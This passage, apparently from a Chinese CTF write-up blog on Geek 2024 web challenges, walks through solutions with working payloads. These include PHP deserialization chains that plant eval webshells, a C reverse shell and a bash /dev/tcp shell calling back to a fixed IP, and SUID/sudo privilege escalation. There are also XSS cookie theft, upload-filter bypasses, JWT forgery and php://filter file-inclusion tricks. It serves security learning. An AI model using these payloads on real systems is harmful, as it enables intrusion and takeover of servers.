class="string">&#x27;file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST[\&#x27;cmd\&#x27;]);?&gt;&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do); <span class="comment">#=&gt;Parar::__set</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;execurise=<span class="string">&quot;man!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead; <span class="comment">#=&gt;Starven::__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123; <span class="comment">#=&gt;SYC::__isset</span></span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc; <span class="comment">#=&gt;Parar:: __get</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();<span class="comment"># =&gt;lhRaMk7::__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();<span class="comment"># =&gt;Starven::__call</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$n</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$l1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$l2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$P1</span> = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$P2</span> = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$S1</span> = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$S2</span> = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$SYC</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$l1</span>-&gt;You = <span class="variable">$P1</span>; <span class="comment">#=&gt;Parar::__set</span></span><br><span class="line"><span class="variable">$P1</span>-&gt;lead = <span class="variable">$S1</span>; <span class="comment">#=&gt;Starven::__toString</span></span><br><span class="line"><span class="variable">$S1</span>-&gt;girl = <span class="variable">$P2</span>; <span class="comment">#=&gt;Parar:: __get</span></span><br><span class="line"><span class="variable">$P2</span>-&gt;hansome = <span class="variable">$SYC</span>; <span class="comment">#=&gt;SYC::__isset</span></span><br><span class="line"><span class="variable">$SYC</span>-&gt;forever = <span class="variable">$S2</span>; <span class="comment">#=&gt;Starven::__call</span></span><br><span class="line"><span class="variable">$S2</span>-&gt;friend = <span class="variable">$l2</span>; <span class="comment">#=&gt;lhRaMk7::__invoke</span></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$l1</span>,<span class="variable">$n</span>));</span><br><span class="line"><span class="variable">$Syclover</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1;N;&#125;&quot;</span>, <span class="string">&quot;i:0;N;&#125;&quot;</span>, <span class="variable">$Syclover</span>);</span><br><span class="line"><span class="comment">// $Syclover=str_replace(&quot;O:7&quot;, &quot;O:8&quot;, $Syclover);</span></span><br><span class="line"><span class="comment">// $Syclover=str_replace(&#x27;s:17:&#x27;, &#x27;s:16:&#x27;, $Syclover);</span></span><br><span class="line"><span class="comment">// $Syclover = rtrim($Syclover, &#x27;&#125;&#x27;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Syclover</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$Syclover</span>);</span><br><span class="line"><span class="comment">// $Syclover=$_GET[&#x27;Syclover&#x27;];</span></span><br><span class="line"><span class="comment">// if (isset($Syclover)) &#123;</span></span><br><span class="line"><span class="comment">//     unserialize(base64_decode($Syclover));</span></span><br><span class="line"><span class="comment">//     throw new Exception(&quot;None&quot;);</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">//     echo(&quot;怎么不给我呢，是不喜欢吗？&quot;);</span></span><br><span class="line"><span class="comment">// &#125; </span></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/ret%20127.png"><br>蚁剑连上shell发现ret 127，说明存在disable_functions<br>在蚁剑市场下载php_disable_functions绕过插件<br>利用其中的PHP7_UserFilter绕过<br><img src="/img/WP/geek2024/bypass.png"><br>发现&#x2F;flag需要root权限，尝试SUID提权</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
</code></pre><p><img src="/img/WP/geek2024/find_result.png"><br>没找到有用的</p><pre><code>sudo -l
</code></pre><p><img src="/img/WP/geek2024/sudo_result.png"></p><p>env 可以直接获取root权限 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://gtfobins.github.io/#env">https://gtfobins.github.io/#env</a></p><pre><code>sudo env /bin/sh
</code></pre><p>蚁剑的shell不大行，切到自己的vps上提权<br>先写个反弹shell <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.revshells.com/">https://www.revshells.com/</a><br>exp.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> port = <span class="number">1234</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">revsockaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;8.155.17.250&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;<span class="string">&quot;bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(<span class="string">&quot;bash&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p>拿到flag<br><img src="/img/WP/geek2024/root%E6%8F%90%E6%9D%83.png"></p><h2 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h2><p>我又来推销fenjing了:<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a><br>fenjing分析确实有ssti漏洞，但是好像不能直接出的样子<br>那就反弹shell</p><pre><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.155.17.250/1234 0&gt;&amp;1&quot;
</code></pre><p><img src="/img/WP/geek2024/fenjing.png"><br><img src="/img/WP/geek2024/ssti.png"></p><h2 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h2><p>一看是经典留言榜，试一试XSS漏洞</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre><p><img src="/img/WP/geek2024/xss.png"><br>确实有漏洞，但是document.cookie不能直接读<br>根据manager路由的提示，考虑通过manager路由带出cookie<br>先写个</p><pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre><p>到留言榜，然后在&#x2F;manager传参url&#x3D;<a target="_blank" rel="external nofollow noopener noreferrer" href="http://127.0.0.1/">http://127.0.0.1/</a> 带出flag<br><img src="/img/WP/geek2024/xss_2.png"></p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p>burp传参如下：<br><img src="/img/WP/geek2024/http1.png"><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://jwt.io/">https://jwt.io/</a> 在这上面把hasFlag的false改为true，key为Starven_secret_key<br><img src="/img/WP/geek2024/http2.png"><br>cookie传参改过的jwt回去拿到flag<br><img src="/img/WP/geek2024/http3.png"></p><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h2><p>能传.htaccess进去？</p><pre><code>AddType application/x-httpd-php .jpg
</code></pre><p><img src="/img/WP/geek2024/upload1.png"><br>不能传.htaccess，但还有个文件叫.user.ini</p><pre><code>auto_prepend_file=a.jpg
</code></pre><p>把a.jpg写上我们的webshell就行了。<br>这也不行？？？<br>结果发现a.jpg.php没被过滤。。。<br>（并不）轻松RCE，flag也不用提权读取<br><img src="/img/WP/geek2024/upload2.png"></p><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还想非预期?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看我的PHP特性集合哦(<a href="https://blog.hatchet.top/posts/44659fec">https://blog.hatchet.top/posts/44659fec</a>)<br>轮流循环绕过</p><pre><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php
?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/starven_secret.php
</code></pre><p>给了&#x2F;levelllll2.php<br>levelllll2.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hint都给的这么明显了还不会做?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a><br>博客中的 pearcmd.php的巧妙利用 可以用于解决这题。<br>仿照博客的poc构造出payload<br><img src="/img/WP/geek2024/include1.png"><br><img src="/img/WP/geek2024/include2.png"></p><h2 id="PHP不比Java差"><a href="#PHP不比Java差" class="headerlink" title="PHP不比Java差"></a>PHP不比Java差</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="variable">$_GET</span>[<span class="string">&quot;change&quot;</span>];</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>又是php反序列化？<br>反转了，我就喜欢做<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_35533398/article/details/108492823">https://blog.csdn.net/qq_35533398/article/details/108492823</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params"><span class="variable">$title</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s. %s\r\n&quot;</span>, <span class="variable">$title</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">array</span>(<span class="string">&#x27;Dr&#x27;</span>, <span class="string">&#x27;Phil&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里面提到ReflectionFunction里的invokeArgs可以用于执行函数。<br>在本地测试下发现也可以执行系统函数system，且没有被题目过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">    <span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure><p>__unserialize()方法在PHP版本大于7.4才被引入。重点方法在于$change该取什么值。<br>问gpt问出来了reset和array_pop，分别取数组的首和尾。<br>让Sink()被调用，就会引用__toString()方法。然后链子就呼之欲出了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__unserialize is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">#var_dump($data);</span></span><br><span class="line">        <span class="comment">#$change = $_GET[&quot;change&quot;];</span></span><br><span class="line">        <span class="variable">$change</span> = <span class="string">&quot;array_pop&quot;</span>;</span><br><span class="line">        <span class="variable">$FUNC</span> = <span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">#var_dump($FUNC);</span></span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span> = <span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$G</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>;</span><br><span class="line"><span class="variable">$S</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">Challenge</span>;</span><br><span class="line"><span class="variable">$G</span>-&gt;a = <span class="variable">$S</span>;</span><br><span class="line"><span class="variable">$G</span>-&gt;b = [<span class="variable">$C</span>,<span class="string">&quot;Sink&quot;</span>];</span><br><span class="line"><span class="variable">$C</span>-&gt;file = <span class="variable">$S</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Where = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;IS = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Starven = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Girlfriend = <span class="string">&#x27;echo \&#x27;&lt;?php @eval($_POST[cmd]); ?&gt;\&#x27; &gt; shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$G</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><p>连上后发现还要SUID提权</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
